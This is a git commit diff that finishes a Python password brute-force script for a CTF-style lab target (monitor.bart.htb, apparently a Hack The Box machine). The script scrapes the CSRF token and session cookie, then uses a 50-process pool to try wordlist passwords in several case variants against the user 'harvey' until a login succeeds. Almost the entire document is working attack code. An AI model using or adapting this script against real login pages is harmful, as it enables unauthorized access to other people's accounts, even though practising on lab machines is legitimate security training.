e62455c176c299ec12017e83001ba113719ba492
root <neal1991@sina.com>
2019-06-07 02:21:15 +0000

    finish Bart

--- Bart/brute_login.py
+++ Bart/brute_login.py
@@ -1,58 +1,66 @@
-#! /usr/bin/env python3
-
 import re
 import requests
 import sys
 from multiprocessing import Pool
 
+
 MAX_PROC = 50
-url = "http://monitor.bart.htb"
+url = "http://monitor.bart.htb/"
 username = "harvey"
 
+#<input type="hidden" name="csrf" value="aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57" />
 csrf_pattern = re.compile('name="csrf" value="(\w+)" /')
 
-def usge():
-    print("{} [wordlist]".format(sys.argv[0])
-    print(" wordlist should be one word per line]")
+def usage():
+    print("{} [wordlist]".format(sys.argv[0]))
+    print("  wordlist should be one word per line]")
     sys.exit(1)
 
 def check_password(password):
-    r = requests.get(url)
-    csrf = re.search(csrf.pattern, r.text).group(1)
-    PHPSESSID = [x.splot('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]
 
-    data = {"csrf": csrf, "user_name": username, "user_password": password, "action": "login"}
+    # get csrf token and PHPSESSID
+    r = requests.get(url)
+    csrf = re.search(csrf_pattern, r.text).group(1)
+    PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]
+
+    # try login:
+    data = {"csrf": csrf,
+            "user_name": username,
+            "user_password": password,
+            "action": "login"}
     proxies = {'http': 'http://127.0.0.1:8080'}
-    headers = {'Cookie': "PESSID={}".format(PHPSESSID)}
+    headers = {'Cookie': "PHPSESSID={}".format(PHPSESSID)}
+    r = requests.post(url, data=data, headers=headers)
 
     if '<p>The information is incorrect.</p>' in r.text:
         return password, False
     else:
-        return passeord, True
+        return password, True
+
 
 def main(wordlist, nprocs=MAX_PROC):
     with open(wordlist, 'r', encoding='latin-1') as f:
-        words = f.read().rstrip().replace('\r', '').split('\n')
+       words = f.read().rstrip().replace('\r','').split('\n')
 
-        words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]
+    words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]
 
-        pool = Pool(processed=nprocs)
+    pool = Pool(processes=nprocs)
 
-        i = 0
+    i = 0
+    print_status(0, len(words))
+    for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
+        if status:
+            sys.stdout.write("\n[+] Found password: {} \n".format(password))
+            pool.terminate()
+            sys.exit(0)
+        else:
+            i += 1
+            print_status(i, len(words))
 
-        print_status(0, len(words))
-        for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
-            if status:
-                sys.stdout.write("\n[+] Found password: {} \n".format(password))
-                pool.terminate()
-                sys.exit(0)
-            else:
-                i += 1
-                print_status(i, len(words))
-        print("\n\nPassword not found\n")
+    print("\n\nPassword not found\n")
 
 def print_status(i, l, max=30):
-    sys.stdout.write("\r|{}>{}| {:>15}/{}".format("=" * ((i*max)//l), "" * (max -((i * max)//l)), i, l))
+    sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i*max)//l), " " * (max - ((i*max)//l)), i, l))
 
 if __name__ == '__main__':
     if len(sys.argv) != 2:
